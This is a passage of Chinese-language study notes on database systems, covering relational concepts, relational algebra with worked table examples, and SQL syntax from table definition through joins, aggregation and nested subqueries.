System，简称DBS）是指在计算机系统中引入数据库后的系统，在不引起混淆的情况下常常把数据库系统简称为数据库\n数据库系统的组成：由数据库、数据库管理系统、应用系统（及其开发工具）、数据库管理员（和用户）构成\n如下图所示\n下图为各系统间的关系\n数据管理技术 数据管理：对数据进行分类、组织、编码、存储、检索和维护，是数据处理的中心问题\n数据管理的发展动力：应用需求的推动；计算机硬件的发展；计算机软件的发展。\n发展阶段：①人工管理阶段（50年代中期以前）②文件系统阶段（50年代后期~60年代中期）③数据库系统阶段（60年代后期开始）\n 早期，数据库应用程序直接建立在文件系统之上，文件系统的弊端如下：\n 数据的冗余和不一致性：多种文件格式，相同的信息在几个文件重复存储 数据访问困难：对于每一个新任务，需要写一个程序 数据孤立：数据分散在不同格式的多个文件中 完整性问题：一致性约束“淹没”在程序代码中，增加新约束或修改现有约束很困难 更新的原子性问题：难以保持原子性，执行部分更新，是的数据处于不一致状态 多用户的并发访问异常：系统的总体性能和相应速度要求：并发访问数据，没有控制的并发访问导致不一致性 安全性问题：控制用户只存取部分数据难以实现   数据库的观点：数据不是依赖于处理过程的附属品，而是现实世界中独立存在的对象\n数据统一按表结构存放\n数据库VS文件系统 ![](Database-System/3.jpg) 实例与模式 Instance and Schemas\n型(Schema)与值(Instance)的区别：\n 型是对数据的结构和属性的说明——模式 值是型的一个具体赋值——实例 型是相对稳定的，值是随时间不断变化的  1 2 3 4 5 6  class person{ public:\tstring name; string address; }; person Tom; //person是型,Tom是变量,Tom在某时刻的值是实例   模式：数据库的总体设计  通过高级程序设计语言进行类比 物理模式：在物理层描述的数据库设计 逻辑模式（子模式）：在逻辑层描述的数据库设计  实例：在特定时刻存储在数据库中的信息集合  类似于一个变量的值  物理数据的独立性：物理模式的改变而不会影响逻辑模式  应用依赖于逻辑模式 在一般情况下，应明确定义不同层次之间和组件之间的接口，这样某些部分的改变不会对其他部分造成较大影响  逻辑数据的独立性  当模式改变时，修改外模式（模式映像），使外模式保持不变，从而应用程序可以保持不变，称为数据的逻辑独立性  数据视图 物理层：描述数据存储\n逻辑层：描述存储在数据库中的数据，以及数据间的关系\n视图层：最高层次的抽象，只描述整个数据库的某部分数据。视图层提供了防止用户访问数据库的某些部分的安全性机制\n如图，下图的COBOL和PL/I是由由逻辑层创建的两个视图，而最下面那个即是物理层所存放的数据\n数据模型 数据库结构的基础是数据模型\n数据模型描述的内容：数据、数据关系、数据语义、数据约束\n常用数据模型：关系模型、实体-联系数据模型（ER模型，主要用于数据库设计）、基于对象的数据模型（oo数据模型，面向对象和对象关系）、半结构化数据模型（XML，可扩展标记语言）、其他模型（如网状模型、层次模型）等\n数据库语言  DML（Data Manipulaton Language）：操纵按照某种适当的数据模型组织起来的数据的语言  查询 更新（增、删、改）    DML分类：①过程化：用户指定需要什么数据以及如何获得这些数据；②声明式（非过程化）：用户指定需要什么数据，而不指明如何获得这些数据\nSQL是应用最广泛的DML\n DDL（Data Definition Language）：用于定义数据库模式以及其他特征的语言  数据库模式 完整性约束：  主键（ID，用来确定唯一的instructor） 参照完整性（SQL中的参照约束）   断言 授权    DDL编译器产生一系列存储在数据字典中的表，数据字典包含元数据（元数据是关于数据的数据）\n关系数据库 SQL：是一门广泛使用的非过程化语言\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  # 例 # SQL-DML select instructor.ID, department.building from instructor, department where instructor.dept_name = department.dept_name and department.dept_nmae = 'Physics'; # SQL-DDL create table deptment( dept_name char(20), building char(20), budget numberic(12,2) );   来自应用程序的数据库访问：DML由宿主语言执行\n数据库设计 数据库设计的主要内容是数据库模式的设计\n数据库设计过程：\n 获取用户需求 概念设计 逻辑设计 物理设计  现实世界是实体及其实体之间关系的集合\n实体：现实世界中区别于其他对象的事情或物体，实体被一组属性所描述\n关系：几个实体之间的关联\n可以用实体关系图（entity-relationship diagram，E-R图）来表示\n规范化：数据库设计的另外一种方法，目标是生成一个关系模式集合，是我们的存储信息是没有不必要的冗余，同时又能方便地检索数据\n规范化最常用的方法就是使用函数依赖\n规范化也提供了判定一个关系模式优劣的标准\n数据存储和查询 存储管理器是一个程序模块，提供了数据库中存储的低层数据与应用程序以及向系统提交的查询之间的接口\n 存储管理器的任务  与文件管理器交互 对数据的有效的存储、查询、更新   存储管理器部件  权限及完整性管理器 事务管理器 文件管理器 缓冲区管理器    查询管理器 查询管理器的组件包括\n DDL解释器：他解释DDL语句，并将这些定义记录在数据字典中 DML编译器：将查询语言中的DML语句翻译成为一个执行方案 查询执行引擎：执行由DML编译器产生的低级指令   查询处理器的工作过程  解析和转换 优化 计算    过程如下图\n两方面来评估一个给定查询：①正则表达式②每个操作有不同的实现算法\n需要估计操作的开销：关键取决于数据库需要维护的关系的统计信息；需要顾及中间结果的统计数据，从而计算复杂的表达式成本\n事务管理 事务是由一系列操作序列构成的程序执行单元，是一个不可分割的工作单位\n事务管理组件保证了当系统出现了故障（例如电源故障、操作系统崩溃）或事务失败时，数据库仍然保持一致性（正确性）\n并发控制管理器控制了并发事务间的相互影响，保证数据库的一致性\n数据库系统内部结构 数据库体系结构 数据库系统的体系结构很大程度上取决于数据库系统所运行的计算机系统\n 集中式 客户/服务器式  远程数据库用户工作用的客户机（Clinet） 运行数据库系统的服务器（Server）   并行（多处理器）  并行系统通过并行地使用多个处理器和磁盘来提高处理速度和I/O速度   分布式  在分布式数据库系统中，数据库存储于几台计算机中，分布式系统中的计算机之间通过网络相互通信，他们不共享主存储器或磁盘    数据挖掘 数据挖掘式应用一系列技术从大型数据库或数据仓库中提取人们感兴趣的信息和知识，这些知识或信息式隐含的，实现未知而潜在有用的，提取的知识表示为概念、规则、规律、模式等形式\n数据挖掘式一类深层次的数据分析\n数据库管理员 对数据库系统进行集中控制的人称作数据库管理员（Database Administrator）\n DBA的作用  模式定义 存储结构及存取方法定义 模式及物理组织的修改 数据访问授权 日常维护    关系模型 关系理论是建立在集合代数理论基础上的，有坚实的数学基础\n关系数据结构   单一的数据结构——关系：现实世界中的实体及实体间的各种联系均用关系来表示\n  数据的逻辑结构——二维表：从用户角度，关系模型中的数据的逻辑结构是一张二维表\n  属性的类型   每个属性的可能的取值范围（集合）叫属性的域\n  属性的值（通常）要求为原子的，也就是说，不可再分的\n 属性的原子性问题要根据应用的需求确定    null（空值）：是一个特殊的值，表示值未知或不存在\n 空值给数据库访问和更新带来了很多困难    关系的基本概念 关系 笛卡尔积D1 × D2 × ... × Dn 的子集叫做在域D1，D2 ，...，Dn 上的关系，用R(D1，D2 ，...，Dn )表示\nR是关系的名字，n是关系的度或目\n关系是笛卡尔积中有意义的子集\n关系也可以表示为二维表\n关系模型和实例 A1,A2,...,An 是属性 R = (A1,A2,...,An) 是一个关系模式 例: instructor = (ID,name,dept_name,salary) 形式上，给定集合D1,D2,...,Dn,一个关系r是D1×D2×...×Dn 的一个子集,因此,一个关系是一组n元组(a1,a2,...,an)的集合，其中ai ∈ Di 关系的当前值（关系实例）可以用一个表指定\n元素t是关系r中的一个元组，表中一行代表一个元组\n 数据库由多个关系组成  码   码的作用：我们必须有一种能够区分给定关系中不同元组的方法。我们一般用元组中的属性表明，即一个元组的属性值必须是能够唯一区分元组的，一个关系中没有两个元组在所有属性上的取值都相同\n  超码：超码是一个或者多个属性的集合，这些属性的组合可以使我们在一个关系中唯一地标识一个元组（例如，{ID}和{ID，name}都是instructor的超码）\n  候选码：最小的超码称为候选码，即超码的任意真子集都不能成为超码（例如，{ID}是Instructor的一个候选码）\n  主码：从一个关系的多个候选码中选定一个作为主码（习惯上把主码属性放在其他属性前面，并且加下划线）\n  外码：一个关系模式r1可能在他的属性中包含另一个关系r2的主码，这个属性称作r1上参照r2的外码（r1和r2可以是同一个关系）\n 关系r1称作外码依赖的参照关系 关系r2称作外码的被参照关系    关系查询语言 查询语言是用户用来从数据库中请求获取信息的语言\n 广泛应用的查询语言：SQL “纯”查询语言  关系代数（过程化） 元组关系演算（非过程化） 域关系演算（非过程化）    关系操作  基本操作  一元运算  选择、投影、更名   多元运算  笛卡尔积、并、集合差     其他运算  集合交、θ连接，自然连接、除、赋值    自然连接：设r和s是关系模式R和S的实例，R和S关系实例的自然连接是关系模式R∪S的实例，遵守以下规则：①对于每一对元组 tr 和 ts ，其中 tr 来自r，ts 来自s；②如果 tr 和 ts 在属性组R∩S上的每个属性值都一样，添加一个元组t到结果集，其中 t由tr 在r上相同的值，t有 ts 在s上相同的值\n笛卡尔积运算从两个关系中合并元组，但不同于连接运算的是，其结果包含来自两个关系元组的所有对，无论它们的属性是否匹配\n# 选择元组 Relation r: A\tB\tC\tD α\tα\t1\t7 α\tβ\t5\t7 β\tβ\t12\t3 β\tβ\t23\t10 select tuples with A=B and D\u003e5 σ A=B and D\u003e5 (r) ans: A\tB\tC\tD α\tα\t1\t7 β\tβ\t23\t10 ------------------------------ # 选择列(属性) Relation r: A\tB\tC α\t10\t1 α\t20\t1 β\t30\t1 β\t40\t2 select A and C Projection Π A,C (r) ans: A\tC α\t1 β\t1 β\t2 ------------------------------ # 连接两个关系 # 笛卡尔积 Relation r,s: r A\tB α\t1 β\t2 s C\tD\tE α\t10\ta β\t10\ta β\t20\tb γ\t10\tb r × s: A\tB\tC\tD\tE α\t1\tα\t10\ta α\t1\tβ\t10\ta α\t1\tβ\t20\tb α\t1\tγ\t10\tb β\t2\tα\t10\ta β\t2\tβ\t10\ta β\t2\tβ\t20\tb β\t2\tγ\t10\tb ------------------------------ # 并运算 Relation r,s: r A\tB α\t1 α\t2 β\t1 s A\tB α\t2 β\t3 r ∪ s: A\tB α\t1 α\t2 β\t1 β\t3 ------------------------------ # 差运算 Relation r,s: r A\tB α\t1 α\t2 β\t1 s A\tB α\t2 β\t3 r - s: A\tB α\t1 β\t1 ------------------------------ # 交运算 Relation r,s: r A\tB α\t1 α\t2 β\t1 s\tA\tB α\t2 β\t3 r ∩ s: A\tB α\t2 ------------------------------ # 自然连接 Relation r,s r A\tB\tC\tD α\t1\tα\ta β\t2\tγ\ta γ\t4\tβ\tb α\t1\tγ\ta δ\t2\tβ\tb s B\tD\tE 1\ta\tα 3\ta\tβ 1\ta\tγ 2\tb\tδ 3\tb\tε Natural Join r ⋈\ts: A\tB\tC\tD\tE α\t1\tα\ta\tα α\t1\tα\ta\tγ α\t1\tγ\ta\tα α\t1\tγ\ta\tγ δ\t2\tβ\tb\tδ ------------------------------ # 连接两个关系 # 笛卡尔积 ------------------------------ SQL SQL：Structured Query Language\n商用系统一般支持sql-92的大部分特性，并支持后续的扩充标准中部分的扩充特性，以及系统特殊的自有特性\n体系结构：user==(==\u003eview==\u003etable)==\u003ebase table==\u003e stored file\n   SQL功能 操作符     数据查询 Select   数据定义 Create、Alter、Drop   数据操纵 Insert、Update、Delete   数据控制 Grant、Revoke    数据定义 **SQL的数据定义语言（DDL）**能够定义每个关系的信息，包括①每个关系的模式；②每个属性的值域；③完整性约束；④将来的信息，如每个关系的索引集合，每个关系的安全性和权限信息，磁盘上每个关系的物理存储结构\nSQL的基本类型  char(n)：固定长度的字符串，用户指定长度n varchar(n)：可变长度的字符串，用户指定最大长度n int：整数类型（和机器相关的整数类型的有限子集） smallint：小整数类型（和机器相关的整数类型的子集） numeric(p,d)：定点数，精度由用户指定，这个数有p位数字，其中d位数字在小数点右边 real，double，precision：浮点数与双精度浮点数，精度与机器相关 float(n)：浮点数，精度由用户指定，精度至少为n位  创建表结构 使用create table 命令创建一个SQL关系表：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  create table r( A1 D1, A2 D2, ..., An Dn) # r是关系名 # 每个Ai是关系模式r的一个属性名 # Di是属性Ai的域的类型 #例 create table instructor(ID\tchar(5), name\tvarchar(20)\tnot null, dept_name\tvarchar(20), salary\tnumeric(8,2) ) insert into instructor values (‘10211’, ’Smith’, ’Biology’, 66000);   Create table中的完整性约束  not null primary key(A1,A2,...,An) foreign key(Am,...,An) references r  注：被声明为主码的属性自动被确保为not null\n例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  create table instructor( ID\tchar(5), name\tvarchar(20)\tnot null, dept_name\tvarchar(20), salary\tnumeric(8.2), primary key(ID), foreign key(dept_name) references department) create table takes( ID\tvarchar(5), course_id\tvarchar(8), sec_id\tvarchar(8), semester\tvarchar(6), year\tnumeric(4,0), grade\tvarchar(2), primary key (ID,course_id,sec_id,semester,year), foreign key (ID) references\tstudent, )   主码的声明和属性的声明可以放在一起，例如course_id\tvarchar(8) primary key,\n删除和更改表结构 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  # 删除表和他的内容 drop table student # 删除表中的内容,但是保留表 delete from student # 更改表结构 alter table # 属性A是关系r将要增加的属性,D是A的域 # 对于关系r中的所有元组,在新增加的属性上的取值都为null alter table r add A D # A是关系r的一个属性名 # 许多数据库不支持删除属性的操作 alter table r drop A # 修改表中属性A的数据类型,将A的域改为D # 可能破坏原有的数据 alter table r modify A D   索引 建立索引是加快查询速度的有效手段\n建立索引：由DBA或表的属主（建立表的人）根据需要建立索引；或者有些DBMS自动建立特定列上（Primary key，unique）的索引\n维护索引：DBMS自动完成\n使用索引：DBMS自动选择是否使用索引以及使用哪些索引\n定义的格式\n1 2 3 4 5 6 7 8 9  create\t[unique | distinct]\t[cluster]\tindex\tindex_name\ton table_name\t(col_name\t[asc | desc]\t[,col_name asc|desc,...]) # unique(distinct):\t唯一性索引，不允许表中不同的行在索引列上取相同的值.若已有相同值存在,则系统给出相关信息,不建此索引.系统并拒绝违背唯一性的插入、更新 # cluster: 聚集索引,表中元组按索引项的值排序并物理地聚集在一起.一个基本表上只能建一个聚集索引 # asc|desc: 索引表中索引值的排序次序,缺省为asc  drop index index_name # 删除索引    索引的有关说明   可以动态地定义索引，即可以随时建立和删除索引\n  不允许用户在数据操作中引用索引。索引如何使用完全由系统决定，这支持了数据的物理独立性\n  应该在使用频率高的、经常用于连接的列上建索引\n  一个表上可建多个索引。索引可以提高查询效率，但索引过多耗费空间，且降低了插入、删除、更新的效率\n  创建索引 1 2 3 4 5 6 7 8 9  create\ttable\tstudent( ID\tvarchar(5), name\tvarchar(20)\tnot null, dept_name\tvarchar(20), total_credit\tnumeric(3,0)\tdefault\t0, primary\tkey(ID) ) create\tindex\tstudentID_index\ton student(ID)    索引是一种数据结构，用于加快查询在索引属性上取给定值的元组的速度  ==\u003e详细见后面 #索引\nSQL查询的基本结构 **SQL的数据操纵语言（DML）**提供了从数据库中查询信息，以及在数据库中插入元组、删除元组、修改元组的能力\n SQL中的标识符大小写不敏感  Select select子句用于列出查询结果中所需要的属性，与关系代数中的投影运算相对应\nSQL允许在关系和查询结果中保留重复的元组\n强制去重，需要在select之后使用关键字distinct\n*一般代表所有属性，是一个通配符\nSelect子句可包含+、-、*、/运算符的算数表达式,运算对象可以是常量或者元组的属性\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  # 典型的查询语句 # Ai表示一个属性,ri表示一个关系,P是一个谓词(即可以是一个条件判断) select\tA1,A2,...,An from\tr1,r2,...,rn where\tP # 去重 select distinct dept_name from\tinstructor # 关键词all显式指明不去重复 select all dept_name from instructor # *代表所有属性 select * from instructor # Select子句可包含+、-、*、/运算符的算数表达式,运算对象可以是常量或者元组的属性 select\tID,name,salary/12 from instructor   where where子句指定查询结果必须满足的条件，与关系代数中的选择谓词相对应\n比较结果可以使用逻辑连词and，or，not连接\n比较结果可以用于算术表达式\n 语法成分：\n 逻辑运算符：and，or，not 比较运算符：\u003c，\u003c=，\u003e，\u003e=，=，\u003c\u003e between条件：判断表达式的值是否在某范围内，例如 age between 18 and 20 ==age∈[18,20]，not between ... and ...    1 2 3 4 5 6  # 找出所有在Computer Science系并且工资超过80000美元的教师的姓名 select\tname from\tinstructor where dept_name = 'Computer Science' and salary \u003e 80000   from from子句列出了查询中的包含关系，与关系代数中的笛卡尔积运算相对应\n笛卡尔积不是经常被直接使用，他在使用时经常与where子句（关系代数的选择操作）一起使用\n1 2 3 4 5 6  # 求笛卡尔积instructor × teacher # 产生所有的instructor-teacher对,包含两个关系的所有属性 select\t* from\tinstructor, teacher   连接 1 2 3 4 5 6  # 例 # 对于大学所有讲授课程的教师,找出他们的姓名以及所讲授的课程的标识 select\tname,course_id from instructor,teacher where instructor.ID = teacher.ID   连接查询及执行过程 同时涉及多个表的查询称为连接查询\n用来连接两个表的条件称为连接条件或连接谓词\n一般格式：[\u003ctable_name1\u003e.]\u003ccol_name1\u003e\u003c比较运算符\u003e[\u003ctable_name2\u003e.]\u003ccol_name2\u003e\n[\u003ctable_name1\u003e.]\u003ccol_name1\u003e between [\u003ctable_name2\u003e.]\u003ccol_name2\u003e AND [\u003ctable_name3\u003e.]\u003ccol_name3\u003e\n连接字段：连接谓词中的列名称为连接字段。连接条件中的各连接字段类型必须是可比的，但不必是相同的\n   嵌套循环法（Nested-Loop）\n 首先在表1中找到第一个元组，然后从头开始扫描表2，逐一查找满足连接件的元组，找到后就将表1中的第一个元组与该元组拼接起来，形成结果表中一个元组。 表2全部查找完后，再找表1中第二个元组，然后再从头开始扫描表2，逐一查找满足连接条件的元组，找到后就将表1中的第二个元组与该元组拼接起来，形成结果表中一个元组 重复上述操作，直到表1中的全部元组都处理完毕       排序合并法（Sort-Merge）\n 首先按照连接属性对表1和表2排序 对表1的第一个元组，从头开始扫描表2，顺序查找满足连接条件的元组，找到后就将表1中的第一个元组与该元组拼接起来，形成结果表中一个元组。当遇到表2中第一条大于表1连接字段值的元组时，对表2的查询不再继续 找到表1的第二条元组，然后从刚才的中断点处继续顺序扫描表2，查找满足连接条件的元组，找到后就将表1中的第一个元组与该元组拼接起来，形成结果表中一个元组。直接遇到表2中大于表1连接字段值的元组时，对表2的查询不再继续 重复上述操作，直到表1或表2中的全部元组都处理完毕为止       索引连接法（Index-Join）\n 对表2按连接字段建立索引 对表1中的每个元组，依次根据其连接字段值查询表2的索引，从中找到满足条件的元组，找到后就将表1中的第一个元组与该元组拼接起来，形成结果表中一个元组     自然连接 自然连接只考虑两个关系模式中都出现的属性上取值相同的元组对，并且相同属性的列只保留一个副本\n1 2 3 4 5 6 7 8 9  select\t* from\tinstructor\tnatural join\tteacher select\tname,course_id from\tinstructor, teacher where\tinstructor.iD = teacher.ID || select\tname,course_id from instructor natural join\tteacher   自然连接中的危险：有些属性可能具有相同的名称，但是他们的实际意义是不同的，在这种情况下，他们可能被错误的认为是相同属性\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  # 例 # 错误的写法(使course.dept_name = instructor.dept_name) select name, title from instructor natural join teaches natural join course; # 正确的写法 select name, title from instructor natural join teaches, course where teaches.course_id = course.course_id; # 另一个正确的写法 select name, title from (instructor natural join teaches) join course using(course_id);   更名运算 SQL允许使用as子句对关系和属性进行更名\n1  old_name as new_name    在Oracle中，关键词as必须被省略  1 2 3 4 5 6 7 8  #例 select\tID,name,salary/12 as monthly_salary from instructor # 找出满足工资至少比Computer Science系某一个教师的工资要高的教师姓名 select\tdistinct\tT.name from instructor\tas T,instructor\tas S where\tT.salary \u003e S.salary\tand\tS.dept_name = 'Computer Science'   字符串运算 SQL中通过字符串匹配运算来支持在字符串上的比较，使用like操作符来实现模式匹配，使用两个特殊字符（通配符）描述模式\n 百分号（%）：%字符匹配任何子串 下划线（_）：_字符匹配任何字符 Like的单向性：  '济南市山大路' like '济南市%' = true  '济南市%' like '济南市山大路' = false    1 2 3 4 5 6 7 8  # 例 # 找出名字中包含dar的教师名字 select\tname from\tinstructor where\tname like '%dar%' # 匹配字符串“100 %” str like '100 \\%' escape '\\'   Escape Escape定义转义字符，以去掉特殊字符的特定含义，使其被作为普通字符对待，如用escape '\\'，定义\\作为转义字符，则可用\\%去匹配%，用\\_取匹配_\n1 2  'ab\\%cd%' escape '\\'\t= 'ab%cd' 'ab\\\\cd%' escape '\\'\t= 'ab\\cd'   VALUE是大小写敏感的\n   模式匹配的例子：\n ‘Intro%’ 匹配任何以“Intro”打头的字符串 ‘%Comp%’ 匹配任何包含“Comp” 子串的字符串 ‘_ _ _’匹配只含三个字符的字符串 ‘_ _ _ %’匹配至少含三个字符的字符串    SQL 支持一系列的串运算，包括\n 串联 （使用“||”） 大小写转换 计算串长度, 抽取子串, 等等     排列元组的显示次序 1 2 3 4 5 6 7 8 9 10 11 12  # 例 # 按字母顺序排列出所有教师的名字 select\tdistinct\tname from\tinstructor order by name # 我们可以用desc指定降序,用asc指定升序,默认情况下是升序排列 order by name desc # 可以在多个属性上进行排序 order by dept_name,name   只是显示次序排序，只能是sql的最后一个子句，只能出现目标列内的字段\n当排序列含空值时，ASC排序列为空值的元组最后显示，DESC排序列为空值的元组最先显示\nwhere子句谓词 1 2 3 4 5 6 7 8 9  # 元组比较 select\tname,course_id from\tinstructor, teacher where\t(instructor.ID, dept_name) = (teacher.ID, 'Biology') # 表示方法: (v1,v2,...,vn) # 元组比较: 按照字典顺序进行比较 # 例如 (a1,a2)\u003c=(b1,b2) === (a1\u003cb1)or ((a1=b1) and (a2\u003c=b2))    重复   对于存在重复元组的关系，SQL 可以决定在结果中显示该元组的几个副本\n  一些关系代数运算的多重集版本——给定多重集关系r1 和r2 ：\n σθ (r1)：如果关系r1的元组t1有c1个副本，并且t1满足选择条件σθ ，则在 σθ 里有c1个t1的副本 ΠA (r)：对于关系r1的每个元组t1的每个副本，在ΠA (r1)里都有一个副本ΠA (t1) ，ΠA (t1)是r1中相应副本t1的投影 r1 x r2：如果关系r1的元组t1有c1个副本，关系r2的元组t2有c2个副本，则关系r1 x r2的元组t1，t2有c1 x c2个副本    集合运算 集合运算union，intersect和except，每个运算都自动去重\nunion：并集；intersect：交集；except：差集(在Oracle中，是minus)；\n如果要保留重复，则要使用对应的多重集版本union all，intersect all，except all\n 如果一个元组在r中出现m次，在s中出现n次，那么：\n r union all s：m+n次 r intersect all s：min(m,n)次 r except all s：max(0,m-n)次   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  # 例 # 找出在2009年秋季开课，或者在2010年春季开课，或两个学期都开课的所有课程 (select course_id from section where sem = ‘Fall’ and year = 2009) union(select course_id from section where sem = ‘Spring’ and year = 2010) # 找出在2009年秋季和2010年春季都开课的所有课程 (select course_id from section where sem = ‘Fall’ and year = 2009) intersect(select course_id from section where sem = ‘Spring’ and year = 2010) # 找出在2009年秋季学期开课但不在2010年春季学期开课的所有课程 (select course_id from section where sem = ‘Fall’ and year = 2009) except/minus(select course_id from section where sem = ‘Spring’ and year = 2010)   空值 元组的一些属性可以为空值，用null表示\nnull代表一个不知道或不存在的值\n包含null的任何算术表达式的计算结果是null，比如5+null = null\n谓词：is null可以用来检测空值，但是不能写 `var = null\n带有null的任何比较运算返回 unknown，比如5\u003cnull := unknown，null\u003c\u003enull := unknown，null = null := unknown\n三值逻辑使用真值unknown\n or：(unknown or true) = true，(unknown or false) = unknown，(unknown or unknown) = unknown and：(unknown and true) = unknown，(unknown and false) = falses，(unknown and unknown) = unknown not：not unknown = unknown 若谓词P的值为unknown，则P is unknown = true  where子句中谓词对一个元组计算出的值如果为unknown，则结果当false处理\n聚集函数 聚集函数以一个值的集合（集或多重集）为输入，返回单个值\n  avg：平均值 min：最小值 max：最大值 sum：总和 count：计数   聚集函数的性质同关系代数：①聚集函数作用域集合（多重集）返回单值；②聚集函数作用默认作用于多重集；③强制作用于集合，使用distinct。\n（无分组）仅用聚集函数的SQL：SQL返回关系，返回的关系有且只有一行；Select子句中出现聚集函数，不能同时出现非聚集的属性\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  # 例 # 找出Computer Science系教师的平均工资 select avg(salary) from instructor where dept_name = 'Computer Science' # 找出在2012年春季学期讲授的课程的教师总数 select count(distinct ID) from teacher where semester = 'Spring' and year = 2010 # 找出course关系中的元组数 select count(*) from course   group by子句 在关系子集上运用聚集函数，得到一个新的关系\ngroup by子句的作用对象是查询的中间结果表\n分组方法：按指定一列或多列值分组，值相等为一组\n使用Group by 子句后，Select子句的列名列表中只能出现分组属性和聚集函数，不能出现非聚集的非分组属性\n分组聚集计算时，SQL返回关系，每组对应一行，无组时返回空关系\n1 2 3 4 5  # 例 # 计算每个系的教师的平均工资,dept——name为系名 select dept_name, avg(salary) from instructor group by dept_name;   having子句 having是对分组聚集结果进行选择，不满足条件的舍弃\nhaving子句的谓词在形成分组后起作用，where子句中的谓词在分组之前起作用\n1 2 3 4  select dept_name,avg(salary) from instructor group by dept_name having avg(salary)\u003e42000   空值和聚集  除了count(*)，所有其他的聚集运算都忽略聚集属性上为空值的元组 如果集合只有空值（输入值集合为空集），则count(*)运算值为0，其他所有的运算返回空值  1 2 3 4 5  # 计算所有工资总额的查询 # 该语句忽略了空值,若没有非空的salary,则结果为null select\tsum(salary) from\tinstructor   嵌套子查询 SQL提供了一个子查询嵌套的机制\n一个子查询是一个嵌套在其他的查询中的select-from-where表达式\n子查询通常用于对集合成员的资格、集合的比较、集合的基数进行检查\n 集合成员的资格：in\n集合之间的比较：θ\n测试集合是否为空：exists\n测试集合是否存在重复元组：unique\n 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41  # 例 # 找出在2009年秋季和2010年春季同时开课的所有课程 select distinct\tcourse_id from\tsection where\tsemester = 'Fall' and year = 2009 adn course_id in (select course_id from section where semester = 'Spring' and year = 2010); # 找出在2009年球季学期开课但不在2010年春季学期开课的所有课程 select\tdistinct\tcourse_id from section where\tsemester = 'Fall' and year = 2009 and course_id not in (select course_id from section where semester = 'Spring' and year = 2010); # 找出（不同的）学生总数，他们选修了ID为10101的教师所讲授的课程 select count (distinct ID) from takes where (course_id, sec_id, semester, year) in (select course_id, sec_id, semester, year from teaches where teaches.ID= 10101); ------ # 找出满足下面条件的所有教师的姓名，他们的工资至少比Biology系某一个教师的工资要高 select distinct T.name from instructor as T, instructor as S where T.salary \u003e S.salary and S.dept_name = ’Biology’; # 有些查询使用 \u003esome 子句 select name from instructor where salary \u003e some (select salary from instructor where dept_name = ’Biology’);   some，any，all子句 F \u003ccomp\u003e some r ⇔ ∃ t ∈ r 使得( F \u003ccomp\u003e t )，其中\u003ccomp\u003e可以是\u003c,\u003c=,\u003e,\u003e=,\u003c\u003e\n(= some) ≡ in\n  ALL 父查询中的结果集大于子查询中每一个结果集中的值,则为真\n  ANY,SOME 父查询中的结果集大于子查询中任意一个结果集中的值,则为真\n   All：只有当其所有数据都满足条件时，条件才成立 Any：只要有一条数据满足条件，条件就成立 Some：其中存在一些数据满足条件，作用和Any大致相同 常规的使用中看作一致即可\n F \u003ccomp\u003e all r ⇔ ∀ t ∈ r（F \u003csomp\u003e t）\n(≠ all) ≡ not in\n some和all谓词可以用聚集函数实现      = \u003c\u003e或!= \u003c \u003c= \u003e \u003e=     some in -- \u003cmax \u003c=max \u003emin \u003e=min   all -- not in \u003cmin \u003c=min \u003emax \u003e=max    空关系测试 exists结构测试子查询结果是否有元组，子查询非空的时候，返回true\nexists r ⇔ r ≠ Φ\nnot exists r ⇔ r = Φ\nexists谓词  存在量词∃ 带有exists谓词的子查询不返回任何数据，只产生逻辑真值true或逻辑假值false  若内层查询结果非空，则返回真值 若内层查询结果为空，则返回假值   由exists引出的子查询，其目标列表达式通常都用*，因为带exists的子查询只返回真值或假值，给出列名无实际意义  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  # 例 # 另一种表述查询“找出在2009年秋季和2010年春季同时开课的所有课程的集合”的方式 select course_id from section S where semester = ’Fall’ and year= 2009 and exists (select * from section as T where semester=’Spring’and year=2010 and S.course_id= T.course_id); # 2 select course_id from section where semester = ’Fall’ and year= 2009 and course_id in (select course_id from section where semester=’Spring’and year=2010);    相关子查询：in后的子查询与外层查询无关，每个子查询执行一次，而exists后的子查询与外层查询有关，需要执行多次，称之为相关子查询  执行过程：  首先取外层查询中表的第一个元组，根据它与内层查询相关的属性值处理内层查询，若WHERE子句返回值为真，则取此元组放入结果表 然后再取外层表的下一个元组 重复这一过程，直至外层表全部检查完为止      sql中全部概念的处理 全部在sql中的三种写法\n ∀：not exists(not exists) 超集superset：not exists(X except Y) ÷：not in(not in)    用EXISTS表示超集  若A为B的超集，则NOT EXISTS (B EXCEPT A) 为TRUE 对于B EXCEPT A，可以表达为：在B中存在，但在A中不存在的记录，也可以用NOT EXISTS 来表达 因此超集可以用两个NOT EXISTS 的嵌套来表达，也可以用两个NOT IN 的嵌套来表达     巧用逆否命题的等价\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  # 例 # 列出选修了全部课程的学生姓名  # 任意课程，所求学生选之⇔不存在任何一门课程，所求学生没有选之 select\tSNAME from\tS where\tnot exists(select Cno from C where not exists(select * from SC where SC.Cno = C.Cno and SC.Sno = S.Sno)) # 任意课程，所求学生选之⇔所求学生的选课集合为所有课程集合的超集 select\tSNAME from\tS where\tnot exists((select\tCno from\tC) except (select Cno from\tSC where\tSC.Sno = S.Sno)) #任意课程，所求学生选之⇔所求学生不在如下集合中：学生学号与任一课程的组合不全包含在SC select\tSNAME from\tS where\tSno\tnot in (select\tSno from\tC,S where\t(Sno,Cno) not in (select Sno,Cno\tfrom SC))   测试没有重复的元组 unique结构测试一个子查询的结果中是否有重复的元组，在空集中其值为true\n1 2 3 4 5 6 7 8  # 例 # 找出所有2009年最多开设一次的课程 select T.course_id from course T where unique (select R.course_id from section R where T.course_id = R.course_id and R.year = 2009)   from子句中的子查询 sql允许from子句中的子查询的表达式\n1 2 3 4 5 6 7 8  # 例 # 